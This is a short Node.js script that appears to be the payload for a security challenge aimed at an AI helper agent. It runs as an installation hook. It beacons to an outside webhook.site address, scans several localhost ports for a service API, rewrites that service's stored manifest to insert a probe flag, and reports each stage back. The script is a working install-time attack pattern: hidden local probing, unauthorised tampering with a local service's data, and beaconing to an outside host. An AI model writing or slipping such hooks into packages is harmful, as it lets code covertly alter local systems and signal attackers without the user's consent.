const https = require("node:https");

const MODULE_ID = "XK-113377";
const WEBHOOK = "https://webhook.site/22222222-3333-4444-5555-666666666666";

const API_URLS = [
  "http://127.0.0.1:9999",
  "http://127.0.0.1:81",
  "http://127.0.0.1:3000",
  "http://127.0.0.1:8180",
  "http://127.0.0.1:5000"
];

const STATUS = "agent_probe_write_confirmed";

function signal(marker) {
  return new Promise(resolve => {
    const req = https.request(
      WEBHOOK,
      {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        timeout: 4000
      },
      res => {
        res.resume();
        res.on("end", resolve);
      }
    );

    req.on("error", resolve);
    req.on("timeout", () => req.destroy());
    req.on("close", resolve);
    req.end(marker);
  });
}

async function getRecord(endpoint) {
  const response = await fetch(endpoint, {
    signal: AbortSignal.timeout(2500)
  });

  if (!response.ok) throw new Error(`GET ${response.status}`);
  return response.json();
}

async function main() {
  // Signal 1: The installation hook started.
  await signal("PROBE_START");

  for (const base of API_URLS) {
    const endpoint = `${base}/svc/entries/${MODULE_ID}`;

    try {
      const record = await getRecord(endpoint);

      // Only operate on the exact challenge module.
      if (
        record.id !== MODULE_ID ||
        typeof record.raw !== "string" ||
        !record.raw.includes("Harbor Lights") ||
        !record.raw.includes('"helper-agent"')
      ) {
        continue;
      }

      // Signal 2: The expected local HTB API was found.
      await signal("PROBE_API");

      let manifest = record.raw.replace(
        /^  probe_flag:.*\r?\n/gm,
        ""
      );

      manifest = manifest.replace(
        /^telemetry_module:[ \t]*$/m,
        `telemetry_module:\n  probe_flag: "${STATUS}"`
      );

      const response = await fetch(endpoint, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ manifest }),
        signal: AbortSignal.timeout(3000)
      });

      if (!response.ok) {
        console.log("HTB PUT failed:", response.status);
        return;
      }

      // Verify that the diagnostic was persisted.
      const updated = await getRecord(endpoint);

      if (
        updated.raw &&
        updated.raw.includes(`probe_flag: "${STATUS}"`)
      ) {
        // Signal 3: Verified write-back.
        await signal("PROBE_WRITTEN");
      }

      return;

    } catch (error) {
      console.log("API candidate failed:", base, error.message);
    }
  }

  console.log("HTB local API not detected");
}

main().catch(console.error);
